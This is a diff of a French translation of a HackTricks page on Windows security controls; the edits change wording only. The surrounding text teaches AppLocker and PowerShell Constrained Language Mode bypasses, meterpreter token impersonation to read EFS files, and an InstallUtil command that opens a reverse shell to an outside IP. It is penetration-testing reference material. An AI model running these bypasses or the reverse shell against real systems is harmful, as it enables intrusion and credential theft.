@@ -1,8 +1,8 @@
 # Contrôles de sécurité Windows
 
 {% hint style="success" %}
-Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -40,7 +40,7 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $a = Get-ApplockerPolicy -effective
 $a.rulecollections
 ```
-Ce chemin de registre contient les configurations et politiques appliquées par AppLocker, fournissant un moyen de revoir l'ensemble actuel des règles appliquées sur le système :
+Ce chemin de registre contient les configurations et les politiques appliquées par AppLocker, fournissant un moyen de revoir l'ensemble actuel des règles appliquées sur le système :
 
 * `HKLM\Software\Policies\Microsoft\Windows\SrpV2`
 
@@ -56,7 +56,7 @@ C:\windows\tracing
 * Les binaires **"LOLBAS"** [**de confiance**](https://lolbas-project.github.io/) peuvent également être utiles pour contourner AppLocker.
 * **Des règles mal écrites peuvent également être contournées**
 * Par exemple, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, vous pouvez créer un **dossier appelé `allowed`** n'importe où et il sera autorisé.
-* Les organisations se concentrent souvent sur le **blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**emplacements d'exécutables PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
+* Les organisations se concentrent souvent sur **le blocage de l'exécutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mais oublient les **autres** [**emplacements d'exécutables PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) tels que `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
 * **L'application des DLL est très rarement activée** en raison de la charge supplémentaire qu'elle peut imposer à un système, et de la quantité de tests nécessaires pour s'assurer que rien ne se casse. Donc, utiliser **des DLL comme portes dérobées aidera à contourner AppLocker**.
 * Vous pouvez utiliser [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) pour **exécuter du code Powershell** dans n'importe quel processus et contourner AppLocker. Pour plus d'infos, consultez : [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
@@ -123,7 +123,7 @@ sc query windefend
 ```
 ## Système de fichiers chiffré (EFS)
 
-EFS sécurise les fichiers par le biais du chiffrement, utilisant une **clé symétrique** connue sous le nom de **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans le **flux de données alternatif** $EFS du fichier chiffré. Lorsque le déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer le FEK à partir du flux $EFS. Plus de détails peuvent être trouvés [ici](https://en.wikipedia.org/wiki/Encrypting\_File\_System).
+EFS sécurise les fichiers grâce au chiffrement, utilisant une **clé symétrique** connue sous le nom de **File Encryption Key (FEK)**. Cette clé est chiffrée avec la **clé publique** de l'utilisateur et stockée dans le **flux de données alternatif** $EFS du fichier chiffré. Lorsque le déchiffrement est nécessaire, la **clé privée** correspondante du certificat numérique de l'utilisateur est utilisée pour déchiffrer le FEK à partir du flux $EFS. Plus de détails peuvent être trouvés [ici](https://en.wikipedia.org/wiki/Encrypting\_File\_System).
 
 **Scénarios de déchiffrement sans initiation de l'utilisateur** incluent :
 
@@ -136,7 +136,7 @@ Cette méthode de chiffrement permet un **accès transparent** aux fichiers chif
 
 * EFS utilise un FEK symétrique, chiffré avec la clé publique de l'utilisateur.
 * Le déchiffrement utilise la clé privée de l'utilisateur pour accéder au FEK.
-* Le déchiffrement automatique se produit dans des conditions spécifiques, comme le copier vers FAT32 ou la transmission sur le réseau.
+* Le déchiffrement automatique se produit dans des conditions spécifiques, comme le copier sur FAT32 ou la transmission sur le réseau.
 * Les fichiers chiffrés sont accessibles au propriétaire sans étapes supplémentaires.
 
 ### Vérifier les informations EFS
@@ -150,9 +150,9 @@ Vous pouvez également utiliser `cipher /e` et `cipher /d` dans un dossier pour 
 
 #### Être Autorité Système
 
-Cette méthode nécessite que l'**utilisateur victime** soit **en train d'exécuter** un **processus** à l'intérieur de l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez usurper le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pourriez simplement `migrate` vers le processus de l'utilisateur.
+Cette méthode nécessite que l'**utilisateur victime** soit **en train d'exécuter** un **processus** à l'intérieur de l'hôte. Si c'est le cas, en utilisant une session `meterpreter`, vous pouvez usurper le jeton du processus de l'utilisateur (`impersonate_token` de `incognito`). Ou vous pourriez simplement `migrer` vers le processus de l'utilisateur.
 
-#### Connaître le mot de passe de l'utilisateur
+#### Connaître le mot de passe des utilisateurs
 
 {% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
 
@@ -164,7 +164,7 @@ Microsoft a développé les **Comptes de service gérés par groupe (gMSA)** pou
 * **Sécurité renforcée** : ces comptes sont immunisés contre les verrouillages et ne peuvent pas être utilisés pour des connexions interactives, renforçant leur sécurité.
 * **Support multi-hôte** : les gMSA peuvent être partagés entre plusieurs hôtes, ce qui les rend idéaux pour les services fonctionnant sur plusieurs serveurs.
 * **Capacité de tâche planifiée** : contrairement aux comptes de service gérés, les gMSA prennent en charge l'exécution de tâches planifiées.
-* **Gestion simplifiée des SPN** : le système met automatiquement à jour le nom principal de service (SPN) lorsqu'il y a des changements dans les détails sAMaccount de l'ordinateur ou le nom DNS, simplifiant la gestion des SPN.
+* **Gestion simplifiée des SPN** : le système met automatiquement à jour le nom principal de service (SPN) lorsqu'il y a des changements dans les détails du sAMaccount de l'ordinateur ou le nom DNS, simplifiant la gestion des SPN.
 
 Les mots de passe pour les gMSA sont stockés dans la propriété LDAP _**msDS-ManagedPassword**_ et sont automatiquement réinitialisés tous les 30 jours par les contrôleurs de domaine (DC). Ce mot de passe, un blob de données chiffrées connu sous le nom de [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), ne peut être récupéré que par des administrateurs autorisés et les serveurs sur lesquels les gMSA sont installés, garantissant un environnement sécurisé. Pour accéder à ces informations, une connexion sécurisée telle que LDAPS est requise, ou la connexion doit être authentifiée avec 'Sealing & Secure'.
 
@@ -180,15 +180,15 @@ Aussi, consultez cette [page web](https://cube0x0.github.io/Relaying-for-gMSA/) 
 
 ## LAPS
 
-La **Solution de Mot de Passe d'Administrateur Local (LAPS)**, disponible en téléchargement sur [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet la gestion des mots de passe d'administrateur local. Ces mots de passe, qui sont **randomisés**, uniques, et **régulièrement changés**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Avec des permissions suffisantes accordées, la capacité de lire les mots de passe d'administrateur local est fournie.
+La **Local Administrator Password Solution (LAPS)**, disponible en téléchargement sur [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permet la gestion des mots de passe des administrateurs locaux. Ces mots de passe, qui sont **randomisés**, uniques, et **régulièrement changés**, sont stockés de manière centralisée dans Active Directory. L'accès à ces mots de passe est restreint par des ACL aux utilisateurs autorisés. Avec des permissions suffisantes accordées, la capacité de lire les mots de passe des administrateurs locaux est fournie.
 
 {% content-ref url="active-directory-methodology/laps.md" %}
 [laps.md](active-directory-methodology/laps.md)
 {% endcontent-ref %}
 
-## Mode de Langage Contraint PS
+## PS Constrained Language Mode
 
-PowerShell [**Mode de Langage Contraint**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, n'autorisant que les types .NET approuvés, les flux de travail basés sur XAML, les classes PowerShell, et plus encore.
+PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **verrouille de nombreuses fonctionnalités** nécessaires pour utiliser PowerShell efficacement, telles que le blocage des objets COM, n'autorisant que les types .NET approuvés, les flux de travail basés sur XAML, les classes PowerShell, et plus encore.
 
 ### **Vérifiez**
 ```powershell
@@ -207,7 +207,7 @@ Dans les versions actuelles de Windows, ce contournement ne fonctionnera pas, ma
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
-#### Reverse shell:
+#### Reverse shell :
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
@@ -243,7 +243,7 @@ Est l'API qui peut être utilisée pour authentifier les utilisateurs.
 
 Le SSPI sera chargé de trouver le protocole adéquat pour deux machines qui souhaitent communiquer. La méthode préférée pour cela est Kerberos. Ensuite, le SSPI négociera quel protocole d'authentification sera utilisé, ces protocoles d'authentification sont appelés fournisseur de support de sécurité (SSP), sont situés à l'intérieur de chaque machine Windows sous la forme d'un DLL et les deux machines doivent prendre en charge le même pour pouvoir communiquer.
 
-### Principaux SSP
+### Principaux SSPs
 
 * **Kerberos** : Le préféré
 * %windir%\Windows\System32\kerberos.dll
@@ -285,7 +285,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 <summary>Soutenir HackTricks</summary>
 
 * Vérifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
